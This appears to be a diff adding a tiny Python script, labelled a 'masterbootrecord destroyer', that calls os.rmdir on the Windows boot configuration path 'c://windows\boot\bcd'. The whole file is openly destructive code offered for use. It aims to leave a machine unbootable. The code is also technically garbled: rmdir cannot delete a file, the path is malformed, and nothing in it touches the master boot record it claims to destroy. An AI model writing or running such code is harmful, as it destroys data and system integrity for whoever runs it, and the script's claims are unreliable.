@@ -1,0 +1,8 @@
+from os import system, name, rmdir
+
+def main():
+    rmdir('c://windows\\boot\\bcd')
+main()
+
+
+masterbootrecord destroyer in python
